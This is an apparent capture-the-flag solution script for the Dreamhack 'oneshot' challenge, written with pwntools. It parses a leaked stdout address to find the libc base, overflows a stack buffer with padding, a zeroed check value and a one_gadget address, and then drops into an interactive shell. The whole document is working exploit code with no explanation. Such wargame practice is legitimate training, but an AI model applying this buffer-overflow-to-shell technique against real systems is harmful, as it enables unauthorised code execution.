#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./oneshot")
#p = remote("host1.dreamhack.games", 8246)
elf = ELF("./oneshot")
libc = ELF("./libc.so.6")
one_gadget_off = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

p.recvuntil(": ")
stdout = int(p.recv(14), 16)
libcBase = stdout - 0x3c5620
one_gadget = libcBase + one_gadget_off[0]
log.info("libcBase : "+hex(libcBase))

gdb.attach(p)
pay = 'A'*(0x20-8) + p64(0) + 'B'*8 + p64(one_gadget)
p.send(pay)

p.interactive()
